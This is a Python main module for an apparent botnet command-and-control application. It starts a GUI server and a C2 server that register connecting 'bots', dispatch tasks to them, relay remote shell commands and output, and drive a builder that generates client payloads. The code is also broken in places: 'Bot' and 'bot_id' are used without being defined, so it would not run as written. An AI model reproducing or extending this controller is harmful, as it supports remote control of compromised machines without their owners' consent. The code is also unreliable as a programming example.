import os
import sys
import logging
import argparse
import traceback

from qtpy.QtWidgets import QApplication
from qtpy.QtCore import Qt, QObject, qInstallMessageHandler, Slot

import qrainbowstyle
from qrainbowstyle.extras import qt_message_handler

from __init__ import __version__, __app_name__
from core.Network import GUIServer, C2Server
from core.build import ClientBuilder
from core.config import ConfigManager
from core.logger import Logger
from client.utils import MessageDecoder, MessageEncoder
from view.MainWindow import MainWindow


class Main(QObject):

    def __init__(self, args):
        super(Main, self).__init__(None)
        self.logger = logging.getLogger(self.__class__.__name__)
        self.start_gui = not args.nogui

        self.gui = None
        self.builder = ClientBuilder()
        self.gui_server = GUIServer()
        self.c2server = C2Server()

        self.config_manager = ConfigManager()
        self.config_manager.config_missing.connect(self.on_config_missing)

        if args.reset:
            self.config_manager.delete_config()

        if args.remote:
            self.gui = MainWindow()
            self.gui.setup_connect_dialog()
        else:
            config = self.config_manager.load()
            if config:
                self.on_config_read(config)

    @Slot()
    def on_config_missing(self):
        """Start GUI server with no config file."""
        gui_ip, gui_port, gui_key = self.gui_server.start_setup()
        self.gui_server.save_config.connect(self.config_manager.save)
        self.gui_server.get_config.connect(self.config_manager.get)
        self.gui_server.setup_options.connect(self.config_manager.on_gui_server_get_setup_options)
        self.gui_server.connected.connect(self.gui_server.on_connected_no_config)
        self.gui_server.close_app.connect(self.exit)

        self.config_manager.config_error.connect(self.gui_server.on_config_error)
        self.config_manager.config_saved.connect(self.gui_server.on_config_saved)
        self.config_manager.config_get.connect(self.gui_server.on_config_get)
        self.config_manager.validation_error.connect(self.gui_server.on_config_validation_error)
        self.config_manager.setup_options.connect(self.gui_server.on_setup_options)

        self.gui_server.start(gui_ip, gui_port, gui_key)
        self.logger.info("To start remote first setup, connect to {}:{} using key: {}".format(gui_ip,
                                                                                              gui_port,
                                                                                              gui_key.decode()))
        if self.start_gui:
            self.gui = MainWindow(local=True)
            self.gui.setup_cancelled.connect(self.exit)
            self.gui.connect_to_gui_server(gui_ip, gui_port, gui_key.decode())

    @Slot(dict)
    def on_config_read(self, config: dict):
        """Start GUI and C2 server."""
        self.logger.info("Configuration files found")
        gui_ip, gui_port, gui_key = config.get("gui_ip"), config.get("gui_port"), config.get("gui_key")

        self.config_manager.config_get.connect(self.gui_server.on_config_get)
        self.config_manager.available_tasks.connect(self.gui_server.on_get_tasks)
        self.gui_server.get_config.connect(self.config_manager.get)

        self.gui_server.close_app.connect(self.exit)

        self.gui_server.stop_task.connect(self.c2server.stop_task)
        self.gui_server.start_task.connect(self.c2server.send_task)
        self.gui_server.get_tasks.connect(self.config_manager.on_gui_server_get_tasks)
        self.gui_server.force_start_task.connect(self.c2server.force_start_task)

        self.builder.build_error.connect(self.gui_server.on_build_error)
        self.builder.build_stopped.connect(self.gui_server.on_build_stopped)
        self.builder.build_options.connect(self.gui_server.on_build_options)
        self.builder.build_finished.connect(self.gui_server.on_build_finished)

        self.builder.generator_progress.connect(self.gui_server.on_generator_progress)
        self.builder.generator_finished.connect(self.gui_server.on_generator_finished)
        self.builder.generator_started.connect(self.gui_server.on_generator_started)

        self.gui_server.build_options.connect(self.builder.get_options)
        self.gui_server.build_stop.connect(self.builder.stop)
        self.gui_server.build_start.connect(self.builder.start)

        self.logger.info("Starting GUI server")
        self.gui_server.start(gui_ip, gui_port, gui_key)
        self.gui_server.setJSONDecoder(MessageDecoder)
        self.gui_server.setJSONEncoder(MessageEncoder)

        self.c2server.assigned.connect(self.on_bot_connected)
        self.c2server.disconnected.connect(self.gui_server.on_bot_disconnected)
        self.c2server.task.connect(self.gui_server.on_bot_task)
        self.c2server.info.connect(self.gui_server.on_bot_info)

        self.c2server.shell_output.connect(self.gui_server.on_shell_output)
        self.c2server.shell_error.connect(self.gui_server.on_shell_error)
        self.gui_server.run_shell.connect(self.c2server.run_shell)

        self.logger.info("Starting C2 server")
        self.c2server.start(config.get("c2_ip"), config.get("c2_port"), config.get("c2_key"))
        self.c2server.setJSONDecoder(MessageDecoder)
        self.c2server.setJSONEncoder(MessageEncoder)

        if self.start_gui:
            self.gui = MainWindow(local=True)
            self.gui.connect_to_gui_server(gui_ip, gui_port, gui_key)
            self.gui.show()

    @Slot(Bot, str, int)
    def on_bot_connected(self, bot, ip, port):
        """Get basic informations from client."""
        infos = self.config_manager.value("after_connection_infos")
        self.c2server.send_info(bot_id, infos)
        self.gui_server.on_bot_connected(bot_id, ip, port)

    @Slot()
    def close(self):
        """Gracefully close server and GUI"""
        self.logger.info("Closing application...")
        if self.c2server:
            self.c2server.close()
            self.c2server.wait()
        if self.gui_server:
            self.gui_server.close()
            self.gui_server.wait()
        if self.gui:
            self.gui.close()

    @Slot()
    def exit(self):
        self.close()
        QApplication.instance().exit()


if __name__ == '__main__':
    logger = Logger()
    logger.enable()
    qInstallMessageHandler(qt_message_handler)

    def exception_hook(exctype, value, tb):
        logging.critical(''.join(traceback.format_exception(exctype, value, tb)))
        sys.exit(1)
    sys.excepthook = exception_hook

    parser = argparse.ArgumentParser(description=__app_name__)
    parser.add_argument('--nogui', action='store_true', help='run in headless mode')
    parser.add_argument('--reset', action='store_true', help='remove application settings')
    parser.add_argument('-r', '--remote', action='store_true', help='run in remote control mode')
    parser.add_argument('-V', '--version', action='version', version='v{}'.format(__version__),
                        help='print version and exit')
    parser.add_argument("-v", "--verbosity", action="count",
                        help="increase logging verbosity", default=0)
    args = parser.parse_args()

    if args.nogui:
        os.environ["QT_QPA_PLATFORM"] = "offscreen"
    if getattr(sys, 'frozen', False):
        application_path = os.path.dirname(sys.executable)
    elif __file__:
        application_path = os.path.dirname(__file__)
    else:
        application_path = "."
    logging.debug("Application path is {}".format(application_path))
    os.chdir(application_path)

    QApplication.setAttribute(Qt.AA_UseHighDpiPixmaps)
    QApplication.setAttribute(Qt.AA_EnableHighDpiScaling)
    QApplication.setQuitOnLastWindowClosed(False)

    app = QApplication(sys.argv)
    app.setApplicationName(__app_name__)
    app.setApplicationVersion(__version__)
    app.setApplicationDisplayName(__app_name__)

    app.setStyleSheet(qrainbowstyle.load_stylesheet(style="Oceanic"))
    font = app.font()
    font.setPointSize(9)
    app.setFont(font)

    m = Main(args)
    sys.exit(app.exec())
